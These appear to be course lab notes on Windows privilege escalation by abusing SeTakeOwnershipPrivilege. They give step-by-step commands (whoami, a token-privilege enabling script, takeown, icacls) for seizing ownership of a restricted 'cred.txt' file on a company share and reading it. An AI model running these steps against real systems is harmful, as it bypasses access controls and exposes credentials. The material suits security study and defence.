# SeTakeOwnershipPrivilege

* `SeTakeOwnershipPrivilege` grants a user the ability to take ownership of any "securable object" - meaning AD objects, NTFS files/folders, printers, registry keys, services, and processes
* Privilege assigns `WRITE_OWNER` rights over an object - user can change the owner within the objects security descriptor
* Administrators are assigned this privilege by default

This setting can be set in Group Policy under:
* Computer Configuration > Windows Settings > Security Settings > Local Policies> User Rights Assignment

* With this privilege, a user could take ownership of any file or object and make changes that could involve access to sensitive data, RCE or DOS
* Encounter a user with this privilege or assign it to them through an attack such as GPO abuse using SharpGPOAbuse
* We could use this privilege to potentially take control of a shared folder or sensitive files

## Reviewing Current User Privileges
<pre>PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled</pre>

## Enabling SeTakeOwnershipPrivilege
* Enable using script - https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1

<pre>Import-Module .\Enable-Privilege.ps1

.\EnableAllTokenPrivs.ps1

whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled</pre>

## Choosing a Target File
* Choose a target file and confirm the current ownership
* We have access to the companies file share and can browse the **Private** and **Public** subdirectories
* Private > all Domain Users can list the contents of certain subdirectories but get an **Access Denied** when trying to read the contents
* We find a file named **cred.txt** under the IT subdirectory of the **Private** share folder during enumeration

User account has `SeTakeOwnershipPrivilege`, we can use it to read any file of our choosing.

* Check target file to gather information

<pre>Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}</pre>

## Check File Ownership
* We do not have sufficient permissions over the object to view
* Check owner of the IT directory

<pre>cmd /c dir /q 'C:\Department Shares\Private\IT'</pre>

* IT share/directory is owned by a service account and does contain a file **cred.txt** with some data inside it

## Take Ownership of the File

<pre>takeown /f 'C:\Department Shares\Private\IT\cred.txt'</pre>

## Confirm Ownership Changes

<pre>Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}</pre>

## Modify the File ACL
* We may still not be able to read the file and need to modify the ACL using icacls to be able to read it

<pre>cat 'C:\Department Shares\Private\IT\cred.txt'

icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F</pre>

## Reading the File

<pre>cat 'C:\Department Shares\Private\IT\cred.txt'</pre>